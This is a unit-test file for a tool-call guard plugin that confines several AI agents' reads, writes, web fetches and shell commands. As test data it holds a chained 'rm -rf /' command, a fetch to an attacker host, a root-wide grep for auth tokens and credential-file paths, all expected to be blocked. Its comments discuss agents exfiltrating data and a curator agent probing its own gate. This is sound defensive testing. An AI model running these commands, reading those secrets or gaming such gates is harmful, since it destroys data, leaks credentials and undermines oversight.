// Unit tests for build-guard's before_tool_call hook.
//
// Run:  node openclaw-enclave/plugins/build-guard/test-guard.mjs
//
// WHY IT TESTS THROUGH THE HOOK, NOT EXPORTED INTERNALS.
// The property that matters is "this tool call is refused", not "this helper
// returns false". Testing the registered handler exercises the same ordering,
// the same fail-closed catch, and the same identity resolution the gateway
// uses. It also means index.mjs exports nothing for tests, so its surface
// stays exactly what the plugin loader needs.
//
// The guard imports `openclaw/plugin-sdk/plugin-entry`, which only resolves
// inside the container. We read the source and swap that one line for a stub,
// then import the result from a temp file — so these tests run on the host
// against the real policy code, with no node_modules and no container.

import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { pathToFileURL } from "node:url";

const GUARD = new URL("./index.mjs", import.meta.url).pathname;

async function loadGuard() {
  const src = fs.readFileSync(GUARD, "utf8");
  const stubbed = src.replace(
    /^import \{ definePluginEntry \} from "openclaw\/plugin-sdk\/plugin-entry";$/m,
    "const definePluginEntry = (x) => x;",
  );
  if (stubbed === src) throw new Error("could not stub the plugin-sdk import");
  const tmp = path.join(
    fs.mkdtempSync(path.join(os.tmpdir(), "build-guard-test-")),
    "guard.mjs",
  );
  fs.writeFileSync(tmp, stubbed);
  const mod = await import(pathToFileURL(tmp).href);

  let handler = null;
  mod.default.register({
    logger: { info() {}, warn() {}, error() {} },
    on(name, fn) {
      if (name === "before_tool_call") handler = fn;
    },
  });
  if (!handler) throw new Error("before_tool_call was not registered");
  return handler;
}

// --- tiny harness -----------------------------------------------------------
let passed = 0;
const failures = [];

async function check(name, fn) {
  try {
    await fn();
    passed++;
  } catch (err) {
    failures.push(`${name}: ${err.message}`);
  }
}

function assert(cond, msg) {
  if (!cond) throw new Error(msg);
}

const handler = await loadGuard();

// Calls the hook and reports whether it blocked.
async function call({ tool, params = {}, agent, sessionKey, runId, derivedPaths }) {
  const res = await handler(
    { toolName: tool, params, derivedPaths },
    { agentId: agent, sessionKey, runId },
  );
  return { blocked: Boolean(res?.block), reason: res?.blockReason ?? "" };
}

const cron = (a) => `agent:${a}:cron:job1:run:r1`;
const chat = (a) => `agent:${a}:chat:main`;

async function allowed(name, args) {
  await check(name, async () => {
    const r = await call(args);
    assert(!r.blocked, `expected ALLOW, got block: ${r.reason.slice(0, 90)}`);
  });
}
async function blocked(name, args, expectSubstring) {
  await check(name, async () => {
    const r = await call(args);
    assert(r.blocked, "expected BLOCK, got allow");
    if (expectSubstring) {
      assert(
        r.reason.includes(expectSubstring),
        `reason missing ${JSON.stringify(expectSubstring)}: ${r.reason.slice(0, 120)}`,
      );
    }
  });
}

// --- identity ---------------------------------------------------------------

await allowed("agentId resolves main", {
  tool: "write", agent: "main", sessionKey: chat("main"),
  params: { path: "/home/node/projects/ExampleProject/a.ts" },
});

await allowed("falls back to sessionKey when agentId absent", {
  tool: "write", sessionKey: chat("main"),
  params: { path: "/home/node/projects/ExampleProject/a.ts" },
});

await allowed("falls back when agentId is malformed", {
  tool: "write", agent: "bad id!", sessionKey: chat("main"),
  params: { path: "/home/node/projects/ExampleProject/a.ts" },
});

await blocked("unknown agent cannot write", {
  tool: "write", agent: "ghost", sessionKey: chat("ghost"),
  params: { path: "/home/node/projects/ExampleProject/a.ts" },
}, "capability set");

await blocked("no identity at all cannot write", {
  tool: "write", sessionKey: "malformed-key",
  params: { path: "/home/node/projects/ExampleProject/a.ts" },
});

await blocked("unknown agent cannot read", {
  tool: "read", agent: "ghost", sessionKey: chat("ghost"),
  params: { path: "/home/node/projects/ExampleProject/a.ts" },
});

// --- per-agent write confinement -------------------------------------------

await allowed("scout writes exchange/raw", {
  tool: "write", agent: "scout", sessionKey: cron("scout"),
  params: { path: "/home/node/exchange/raw/ph-2026-07-31.md" },
});
await blocked("scout cannot write projects", {
  tool: "write", agent: "scout", sessionKey: cron("scout"),
  params: { path: "/home/node/projects/ExampleProject/a.ts" },
});
await blocked("scout cannot write briefs", {
  tool: "write", agent: "scout", sessionKey: cron("scout"),
  params: { path: "/home/node/exchange/briefs/b.json" },
});

// briefs-pending/, NOT briefs/. This assertion said `briefs/` and expected
// ALLOW until 2026-08-08 — it had been failing since the 2026-08-02 change that
// moved the curator behind the sealer, and nothing was running the suite to
// notice. The policy was right the whole time; the test was describing a
// version of it that no longer existed.
await allowed("curator writes briefs-pending", {
  tool: "write", agent: "curator", sessionKey: cron("curator"),
  params: { path: "/home/node/exchange/briefs-pending/b.json" },
});
await blocked("curator cannot write briefs", {
  tool: "write", agent: "curator", sessionKey: cron("curator"),
  params: { path: "/home/node/exchange/briefs/b.json" },
});
await blocked("curator cannot write raw", {
  tool: "write", agent: "curator", sessionKey: cron("curator"),
  params: { path: "/home/node/exchange/raw/x.md" },
});
// The far side of its own gate, both destinations. A curator that can see which
// directory its brief landed in learns whether its own instruction-flag was
// believed, and can tune the flag until briefs land where it prefers.
await blocked("curator cannot write briefs-flagged", {
  tool: "write", agent: "curator", sessionKey: cron("curator"),
  params: { path: "/home/node/exchange/briefs-flagged/b.json" },
});
await blocked("curator cannot read briefs-flagged", {
  tool: "read", agent: "curator", sessionKey: cron("curator"),
  params: { path: "/home/node/exchange/briefs-flagged/b.json" },
});
await blocked("main cannot write briefs-flagged", {
  tool: "write", agent: "main", sessionKey: chat("main"),
  params: { path: "/home/node/exchange/briefs-flagged/b.json" },
});

await allowed("main writes its workspace", {
  tool: "write", agent: "main", sessionKey: chat("main"),
  params: { path: "/home/node/.openclaw/workspace/memory/NOTES.md" },
});
await allowed("main writes a research request", {
  tool: "write", agent: "main", sessionKey: chat("main"),
  params: { path: "/home/node/exchange/requests/abc.json" },
});
// The exfiltration direction: main must never put bytes where scout reads.
await blocked("main cannot write scout inbox", {
  tool: "write", agent: "main", sessionKey: chat("main"),
  params: { path: "/home/node/exchange/inbox/abc.json" },
});
await blocked("main cannot write briefs", {
  tool: "write", agent: "main", sessionKey: chat("main"),
  params: { path: "/home/node/exchange/briefs/b.json" },
});

// --- per-agent read confinement --------------------------------------------

await blocked("scout cannot read projects", {
  tool: "read", agent: "scout", sessionKey: cron("scout"),
  params: { path: "/home/node/projects/ExampleProject/README.md" },
});
await allowed("scout reads its inbox", {
  tool: "read", agent: "scout", sessionKey: cron("scout"),
  params: { path: "/home/node/exchange/inbox/abc.json" },
});
await allowed("curator reads normalized", {
  tool: "read", agent: "curator", sessionKey: cron("curator"),
  params: { path: "/home/node/exchange/normalized/x.md" },
});
await blocked("curator cannot read raw", {
  tool: "read", agent: "curator", sessionKey: cron("curator"),
  params: { path: "/home/node/exchange/raw/x.md" },
});
// main's reads are deliberately unconfined (templates/, skills/, scripts/, workspace).
await allowed("main reads templates", {
  tool: "read", agent: "main", sessionKey: chat("main"),
  params: { path: "/home/node/templates/INDEX.md" },
});
await allowed("main lists its workspace root", {
  tool: "list", agent: "main", sessionKey: chat("main"),
  params: { path: "/home/node/.openclaw/workspace" },
});
// A grep PATTERN is not a location and must not be judged as one.
await allowed("grep pattern is not treated as a path", {
  tool: "grep", agent: "scout", sessionKey: cron("scout"),
  params: { pattern: "TODO", path: "/home/node/exchange/inbox" },
});

// --- credential reads (regression, incl. the two added 2026-07-31) ----------

for (const [name, p] of [
  ["run/secrets", "/run/secrets/openclaw_secrets"],
  ["mcp-oauth", "/home/node/.openclaw/mcp-oauth/linear-x.json"],
  ["identity", "/home/node/.openclaw/identity/device-auth.json"],
  ["exec-approvals", "/home/node/.openclaw/exec-approvals.json"],
  ["session sqlite", "/home/node/.openclaw/state/openclaw.sqlite"],
  ["devices", "/home/node/.openclaw/devices/paired.json"],
]) {
  await blocked(`main cannot read ${name}`, {
    tool: "read", agent: "main", sessionKey: chat("main"), params: { path: p },
  }, "credentials");
}

await blocked("recursive grep at / is refused", {
  tool: "grep", agent: "main", sessionKey: chat("main"),
  params: { pattern: "authToken", path: "/" },
}, "credentials");

// --- fetch budget -----------------------------------------------------------

await allowed("scout first scheduled fetch", {
  tool: "web_fetch", agent: "scout", sessionKey: cron("scout"), runId: "run-A",
  params: { url: "https://www.producthunt.com/feed" },
});
await blocked("scout second scheduled fetch in same run", {
  tool: "web_fetch", agent: "scout", sessionKey: cron("scout"), runId: "run-A",
  params: { url: "https://attacker.example/?p=x" },
}, "one-shot");
await allowed("a different run gets its own budget", {
  tool: "web_fetch", agent: "scout", sessionKey: cron("scout"), runId: "run-B",
  params: { url: "https://www.producthunt.com/feed" },
});
await blocked("scheduled fetch with no runId fails closed", {
  tool: "web_fetch", agent: "scout", sessionKey: cron("scout"),
  params: { url: "https://www.producthunt.com/feed" },
});
// Interactive scout is the human-approved research path: unbudgeted.
for (const n of [1, 2, 3]) {
  await allowed(`interactive scout fetch ${n} is unbudgeted`, {
    tool: "web_fetch", agent: "scout", sessionKey: chat("scout"), runId: "run-C",
    params: { url: "https://example.com" },
  });
}
// perplexity MCP tool names are matched by substring, not an exact list.
await blocked("perplexity counts against the same budget", {
  tool: "mcp__perplexity__perplexity_search", agent: "scout",
  sessionKey: cron("scout"), runId: "run-A", params: { query: "x" },
}, "one-shot");

await blocked("main has no web tools", {
  tool: "web_fetch", agent: "main", sessionKey: chat("main"),
  params: { url: "https://example.com" },
}, "research request");

// --- regressions: the pre-existing rules must still hold --------------------

await blocked("write to exec-approvals still refused", {
  tool: "write", agent: "main", sessionKey: chat("main"),
  params: { path: "/home/node/.openclaw/exec-approvals.json" },
}, "configuration and state");

await blocked("edit with no discernible path fails closed", {
  tool: "apply_patch", agent: "main", sessionKey: chat("main"), params: {},
}, "could not be determined");

await blocked("exec refused in scheduled runs", {
  tool: "exec", agent: "main", sessionKey: cron("main"),
  params: { command: "/home/node/scripts/check-approvals.sh" },
}, "scheduled runs");

await blocked("raw python3 refused interactively", {
  tool: "exec", agent: "main", sessionKey: chat("main"),
  params: { command: "python3 -c 'print(1)'" },
}, "wrapper scripts");

await blocked("shell chaining onto a wrapper refused", {
  tool: "exec", agent: "main", sessionKey: chat("main"),
  params: { command: "/home/node/scripts/check-approvals.sh; rm -rf /" },
});

// MATCHED ON THE MESSAGE, NOT ON THE CONSTANT'S NAME. These two asserted
// "internal" until 2026-08-10 and had been failing for as long as anyone had
// run them: the constant is EXEC_INTERNAL_REASON, but the text it renders never
// contained the word — it says the script is not meant to be run directly. Both
// commands were refused the whole time, so this was a stale assertion and not a
// hole; the fix is to match what the agent is actually told, because that is
// the thing a reader can check. "not meant to be run directly" appears exactly
// once in index.mjs, so it still discriminates EXEC_INTERNAL_REASON from
// EXEC_INTERACTIVE_REASON rather than passing on any block at all.
await blocked("internal wrapper refused directly", {
  tool: "exec", agent: "main", sessionKey: chat("main"),
  params: { command: "/home/node/scripts/quarantine-seal.sh" },
}, "not meant to be run directly");

// No agent-facing wrappers in this public cut: any wrapper is treated as
// internal/long-running and refused at the interactive gate, same as seal.
await blocked("remaining wrappers are not agent-facing", {
  tool: "exec", agent: "main", sessionKey: chat("main"),
  params: { command: "/home/node/scripts/check-approvals.sh" },
}, "not meant to be run directly");

// --- report -----------------------------------------------------------------

if (failures.length) {
  console.error(`\nbuild-guard: ${failures.length} FAILED, ${passed} passed\n`);
  for (const f of failures) console.error(`  ✗ ${f}`);
  process.exit(1);
}
console.log(`build-guard: all ${passed} checks passed`);
